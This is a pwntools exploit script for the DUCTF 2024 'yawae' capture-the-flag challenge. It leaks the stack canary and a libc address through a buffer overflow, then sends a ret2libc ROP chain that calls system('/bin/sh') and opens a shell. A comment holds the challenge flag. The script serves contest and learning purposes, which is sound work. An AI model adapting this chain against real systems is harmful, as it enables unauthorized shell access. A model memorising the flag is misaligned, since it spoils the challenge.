#!/usr/bin/env python3
from pwn import *

exe = ELF("./yawae")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
# context.log_level='debug'
context.terminal = ["foot"]
if args.REMOTE:
    p = remote("2024.ductf.dev", 30010)
else:
    p = process([exe.path])
    gdb.attach(p, """

               """)
    # p = gdb.debug([exe.path],"""
    #
    #                 """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sla(b">",b"1")
s(b"a"*(104-15))
sla(b">",b"2")
p.recvuntil(b"a"*(104-15))
canary = b"\00"+p.recv(7)
log.info(f"canary: {canary}")
sla(b">",b"1")
sl(b"a"*104)
sla(b">",b"2")
p.recvuntil(b"a"*104)
addr = u64(p.recv(6).ljust(8, b"\x00"))
libc.address = addr - 0x29d0a
log.info(f"leak addr: {hex(addr)}")
sla(b">",b"1")
sl(b"a"*(104-16)+canary+p64(0)+p64(libc.address+0x00000000000baaf9)+p64(libc.address+0x000000000002a3e5)+p64(libc.search(b"/bin/sh").__next__())+p64(libc.sym.system))
#DUCTF{Hello,AAAAAAAAAAAAAAAAAAAAAAAAA}







p.interactive()
# good luck pwning :)

